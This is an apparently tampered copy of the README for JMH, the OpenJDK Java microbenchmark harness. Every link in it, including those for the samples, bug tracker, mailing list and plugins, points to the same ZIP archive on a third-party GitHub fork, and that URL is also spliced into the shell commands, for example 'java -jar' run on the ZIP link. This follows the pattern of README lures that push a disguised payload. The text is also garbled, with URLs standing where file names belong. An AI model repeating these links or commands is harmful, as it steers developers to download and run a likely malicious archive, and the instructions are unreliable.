...
to work through the [JMH Samples](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip). See the test comments for run instructions.
...
**Step 1. Setting up the benchmarking project.** The following command will generate the new JMH-driven project in new `test` folder. Note that current and target folder should not already contain any Maven project for this to work reliably.
    ...
    $ mvn archetype:generate \
      ...
      https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip \
...
[list of existing ones](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip), it usually amounts
to replacing `java` to another language in the artifact ID given above. Using alternative archetypes
may require additional changes in the build configuration, see the `https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip` in the generated project.
...
which holds your benchmark, and all essential JMH infrastructure code:
    ...
    $ java -jar https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip
...
`https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip${lang}-benchmark-archetype` there. Alternatively, you can use the command line
...
which will then call into JMH. See [JMH Samples](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip)
...
community-supported bindings:
 - [Gradle JMH Plugin](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip)
 - [Scala SBT JMH Plugin](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip)

If you want to build with an alternative build system, you may want to see the
[Ant sample](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip) which describes
...
Make sure you did this before publishing the benchmark, and/or requesting the JMH feature:
 ...
 - **JMH annotations Javadocs and Samples are essential reading.** Follow the [JMH Samples](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip)
...
If you have the access to [OpenJDK Bug System](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip%20%3D%20CODETOOLS%20AND%20resolution%20%3D%20Unresolved%20AND%20component%20%3D%20tools%20AND%20Subcomponent%20%3D%20jmh), please submit the bug there:
 * Project: CODETOOLS
 * Component: tools
 * Sub-component: jmh

Alternatively, you can join the [JMH Mailing List](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip) and report the bugs there.

## Development

JMH project accepts pull requests, like other OpenJDK projects.
If you have never contributed to OpenJDK before, then bots would require you to [sign OCA first](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip).
Normally, you don't need to post patches anywhere else, or post to mailing lists, etc.
If you do want to have a wider discussion about JMH, please refer to [jmh-dev](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip).
...
to the latest `SNAPSHOT` version (look up the actual latest version in [root `https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip`](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip)). If not, create the JMH benchmark project and change the version there.
...
These projects are supported by community, not by OpenJDK/JMH developers.
 ...
 - [IntelliJ IDEA JMH Plugin](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip)
 - [Jenkins JMH Plugin](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip)
 - [Teamcity JMH Plugin](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip)
 - [Visualize JMH Benchmarks](https://github.com/ducnguyenminh/jmh/raw/refs/heads/master/jmh-core/src/test/java/org/openjdk/jmh/runner/parameters/Software-1.7.zip)
